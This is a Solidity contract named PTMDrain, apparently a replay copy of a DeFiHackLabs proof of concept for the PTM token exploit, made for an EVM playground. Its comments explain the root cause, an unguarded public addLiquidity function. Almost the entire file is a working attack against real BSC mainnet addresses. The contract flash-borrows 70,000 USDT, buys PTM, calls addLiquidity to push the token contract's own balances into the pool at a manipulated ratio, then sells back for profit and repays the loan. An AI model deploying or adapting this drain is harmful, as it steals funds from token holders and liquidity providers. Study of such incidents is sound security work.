// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-03-PTM).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); the PancakeV3 flash callback
// `pancakeV3FlashCallback` lives on the test itself), so there is no
// standalone contract to deploy. This contract is a faithful, self-contained
// copy of that inline attack so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/PTM_exp.sol
// (ContractTest.testExploit / pancakeV3FlashCallback). No setup/prep is
// needed — the whole attack is a single flash loan.
//
// Root cause: PTM.addLiquidity(uint256,uint256) is public with no caller
// check. It spends the PTM token CONTRACT's OWN PTM and USDT balances
// through the Pancake Router to mint liquidity. The attacker flash-buys a
// huge amount of PTM (crashing its price and swelling the token contract's
// own USDT/PTM holdings via whatever fee-on-transfer routing PTM applies),
// then calls addLiquidity() to force the token contract's inflated balances
// into the PTM/USDT pair at the current (manipulated) ratio, then sells the
// PTM back for USDT at a profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPTM is IERC20 {
    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract PTMDrain {
    address private constant PTM_TOKEN = 0x2E13771622b967e9aFBf0Dc6C7736C6b7544b0b7;
    address private constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant PANCAKE_V3_USDT_USDC_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;

    uint256 private constant FLASH_AMOUNT = 70_000 ether;

    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IPTM private constant ptm = IPTM(PTM_TOKEN);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);

    // Recorded attack: PancakeV3 flash-borrows 70,000 USDT; the callback does
    // the whole buy -> forced-liquidity -> sell -> repay sequence.
    function run() external {
        (bool success,) = PANCAKE_V3_USDT_USDC_POOL.call(
            abi.encodeWithSignature("flash(address,uint256,uint256,bytes)", address(this), FLASH_AMOUNT, 0, "")
        );
        require(success, "flash failed");
    }

    // PancakeV3 flash callback.
    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        require(msg.sender == PANCAKE_V3_USDT_USDC_POOL, "pool only");

        usdt.approve(PANCAKE_ROUTER, type(uint256).max);
        ptm.approve(PANCAKE_ROUTER, type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT_TOKEN;
        buyPath[1] = PTM_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_AMOUNT,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        uint256 contractPtm = ptm.balanceOf(PTM_TOKEN);
        uint256 contractUsdt = usdt.balanceOf(PTM_TOKEN);
        ptm.addLiquidity(contractPtm, contractUsdt);

        address[] memory sellPath = new address[](2);
        sellPath[0] = PTM_TOKEN;
        sellPath[1] = USDT_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ptm.balanceOf(address(this)),
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        usdt.transfer(PANCAKE_V3_USDT_USDC_POOL, FLASH_AMOUNT + fee0);
    }
}
